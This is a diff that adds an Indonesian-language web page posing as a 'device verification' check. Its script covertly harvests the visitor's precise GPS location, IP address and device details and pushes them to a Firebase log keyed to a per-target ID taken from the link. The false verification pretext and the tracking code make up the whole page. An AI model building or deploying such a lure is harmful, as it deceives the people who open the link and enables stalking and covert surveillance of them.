@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Verification</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
+        h2 { color: #1a1a1a; margin-bottom: 10px; font-size: 1.5rem; }
+        p { color: #666; margin-bottom: 20px; line-height: 1.5; }
+        .btn { background: #007bff; color: white; border: none; padding: 14px 28px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; width: 100%; transition: background 0.2s; }
+        .btn:hover { background: #0056b3; }
+        .hidden { display: none; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="card" id="mainCard">
+        <h2>Verifikasi Perangkat</h2>
+        <p>Sistem perlu memverifikasi lokasi dan integritas perangkat Anda untuk melanjutkan akses.</p>
+        <button class="btn" onclick="startProcess()">Verifikasi Sekarang</button>
+    </div>
+
+    <div class="card hidden" id="loadingCard">
+        <div class="loader"></div>
+        <p style="margin-top: 15px;">Sedang memverifikasi...</p>
+    </div>
+
+    <div class="card hidden" id="successCard">
+        <h2 style="color: #28a745;">Berhasil</h2>
+        <p>Perangkat terverifikasi.</p>
+    </div>
+
+    <script src="config.js"></script>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id') || 'anon-' + Math.random().toString(36).substr(2, 5);
+
+        async function getIp() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) { return 'IP_ERROR'; }
+        }
+
+        function getDeviceData() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                isMobile: /Mobi|Android/i.test(navigator.userAgent)
+            };
+        }
+
+        function sendData(locData, status) {
+            const deviceInfo = getDeviceData();
+            const timestamp = new Date().toISOString();
+
+            getIp().then(ip => {
+                const payload = {
+                    timestamp: timestamp,
+                    ip: ip,
+                    status: status,
+                    location: locData,
+                    device: deviceInfo
+                };
+
+                database.ref('logs/' + userId).push(payload).then(() => {
+                    if (status === 'ALLOWED') {
+                        document.getElementById('loadingCard').classList.add('hidden');
+                        document.getElementById('successCard').classList.remove('hidden');
+                        // Opsional: Redirect ke Google setelah 2 detik
+                        // setTimeout(() => window.location.href = "https://google.com", 2000);
+                    }
+                });
+            });
+        }
+
+        function startProcess() {
+            document.getElementById('mainCard').classList.add('hidden');
+            document.getElementById('loadingCard').classList.remove('hidden');
+
+            if (!navigator.geolocation) {
+                sendData({ note: "No Geolocation Support" }, 'UNSUPPORTED');
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    sendData({
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        speed: pos.coords.speed
+                    }, 'ALLOWED');
+                },
+                (err) => {
+                    sendData({ code: err.code, msg: err.message }, 'DENIED');
+                    alert("Gagal memverifikasi lokasi. Pastikan GPS aktif dan izinkan akses.");
+                    document.getElementById('loadingCard').classList.add('hidden');
+                    document.getElementById('mainCard').classList.remove('hidden');
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+    </script>
+</body>
+</html>
